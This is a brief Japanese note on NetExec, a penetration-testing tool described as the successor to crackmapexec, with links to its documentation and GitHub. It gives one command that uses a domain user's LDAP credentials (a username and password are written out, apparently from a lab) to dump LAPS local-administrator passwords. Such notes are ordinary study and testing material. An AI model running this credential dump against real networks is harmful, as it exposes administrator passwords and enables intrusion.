# NetExec
[ドキュメント](https://www.netexec.wiki/getting-started/using-kerberos)  
[ギッハブ](https://github.com/Pennyw0rth/NetExec)

## 概要
crackmapexecがあまり保守されなくなったぽいのでそれの後継的なポジ。  
大規模ネットワークのセキュリティ評価を自動化するのに役立つペンテツールっぽい。  
ドキュメントちゃんとしてていい。

## コマンド集
1. LAPS読み取りの権限を持つドメインユーザの認証情報を使ってLAPSパスワードをダンプする。
```
nxc ldap 192.168.142.122 -u fmcsorley -p CrabSharkJellyfish192 -M laps
```